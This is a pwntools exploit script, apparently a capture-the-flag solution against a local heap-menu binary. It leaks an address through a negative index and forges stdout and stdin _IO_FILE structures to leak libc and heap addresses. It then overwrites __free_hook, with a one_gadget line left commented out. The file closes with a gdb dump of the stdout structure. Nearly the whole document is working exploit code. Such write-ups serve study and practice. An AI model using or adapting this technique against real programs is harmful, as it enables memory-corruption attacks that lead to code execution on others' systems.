from pwn import *

context(arch='amd64', log_level='debug')

r = remote('localhost', 1111)

def add(idx, size, content):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('IDX : ', str(idx))
    r.sendlineafter('SIZE : ', str(size))
    r.send(content)
#      r.sendafter('CONTENT: ', content)

def show(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter('IDX : ', str(idx))

def rm(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter('IDX : ', str(idx))

def take_flag():
    r.sendlineafter('>> ', '4')

libc = ELF('./libc.so.6')

show(-7)
data = u64(r.recv(6) + b'\0\0') - 8
success('data='+hex(data))

# fopen() will malloc a chunk for struct _IO_FILE
# and fclose() will free it
take_flag()

# point stdout to our fake file stream structure
# retrieve the same chunk that take_flag() used, so that structure is similar
# set stdout->_IO_write_base to the address we want to leak
#
# the key is (*_IO_FILE)stdout->_flags:
# /usr/include/libio.h:
# #define _IO_MAGIC 0xFBAD0000
# #define _IO_CURRENTLY_PUTTING 0x800
# #define _IO_IS_APPENDING 0x1000
#
# make sure stdout->_IO_write_ptr == stdout->_IO_write_end,
# so that buffer will be flushed instantly
fake_stdout = flat(
    0xfbad1800, 0,
    0, 0,
    data-0x30, data+0x40,
    data+0x40, data+0x40,
    data+0x40, 0,
    0, 0,
    0, 0,
    1)
add(-4, 0x228, fake_stdout + b'\n')

# leak buffer data
r.recvuntil("=========\n")
r.recvuntil("=========\n")

libc.address = u64(r.recv(6) + b'\0\0') - libc.sym.exit
r.recv(0x50 - 6)
heap = u64(r.recv(6) + b'\0\0') - 0x260
success('libc='+hex(libc.address))
success('heap='+hex(heap))

# similarly, control stdin for arbitrary write
# this time we don't use the file structure left by fopen()
# since fclose() will set fd to -1, and stdin will be broken
one_gadget = 0x4f322 # constraint: [rsp+0x40] == NULL
fake_stdin = flat(
    0xfbad0000, 0,
    0, 0,
    0, 0,
    # set _IO_buf_base to where we want to write
    # here we write __realloc_hook and __malloc_hook consecutively
    0, libc.sym.__free_hook,
    libc.sym.__free_hook+0x8, 0,
    0, 0,
    0, 0,
    0, 0xffffffffffffffff, # fd |
    0, data+0x80, # | lock
    0xffffffffffffffff, 0,
    0, 0,
    0, 0,
    0xffffffff, 0, # mode |
    0, libc.sym._IO_file_jumps)
add(0, 0x228, fake_stdin + b'\n')
rm(0)
add(-2, 0x228, p64(0xdeadbeef)[:-1])
#  add(-2, 0x228, p64(libc.address + one_gadget))
#  add(-2, 0x228, p64(0xdeadbeef) + p64(libc.sym.__libc_realloc+14))
rm(0)

while True: sleep(100000000)



# <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007ffb91d237e3
# <_IO_2_1_stdout_+16>:    0x00007ffb91d237e3      0x00007ffb91d237e3
# <_IO_2_1_stdout_+32>:    0x00007ffb91d237e3      0x00007ffb91d237e3
# <_IO_2_1_stdout_+48>:    0x00007ffb91d237e3      0x00007ffb91d237e3
# <_IO_2_1_stdout_+64>:    0x00007ffb91d237e4      0x0000000000000000
# <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
# <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007ffb91d22a00
# <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
# <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007ffb91d248c0
# <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
# <_IO_2_1_stdout_+160>:   0x00007ffb91d228c0      0x0000000000000000
# <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
# <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
# <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007ffb91d1f2a0

#  $2 = {
#    file = {
#      _flags = 0xfbad2887,
#      _IO_read_ptr = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_read_end = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_read_base = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_write_base = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_write_ptr = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_write_end = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_buf_base = 0x7ffb91d237e3 <_IO_2_1_stdout_+131> "\n",
#      _IO_buf_end = 0x7ffb91d237e4 <_IO_2_1_stdout_+132> "",
#      _IO_save_base = 0x0,
#      _IO_backup_base = 0x0,
#      _IO_save_end = 0x0,
#      _markers = 0x0,
#      _chain = 0x7ffb91d22a00 <_IO_2_1_stdin_>,
#      _fileno = 0x1,
#      _flags2 = 0x0, // memory does not store this
#      _old_offset = 0xffffffffffffffff,
#      _cur_column = 0x0,
#      _vtable_offset = 0x0,
#      _shortbuf = "\n",
#      _lock = 0x7ffb91d248c0 <_IO_stdfile_1_lock>,
#      _offset = 0xffffffffffffffff,
#      _codecvt = 0x0,
#      _wide_data = 0x7ffb91d228c0 <_IO_wide_data_1>,
#      _freeres_list = 0x0,
#      _freeres_buf = 0x0,
#      __pad5 = 0x0,
#      _mode = 0xffffffff,
#      _unused2 = '\000' <repeats 19 times>
#    },
#    vtable = 0x7ffb91d1f2a0 <_IO_file_jumps>
#  }

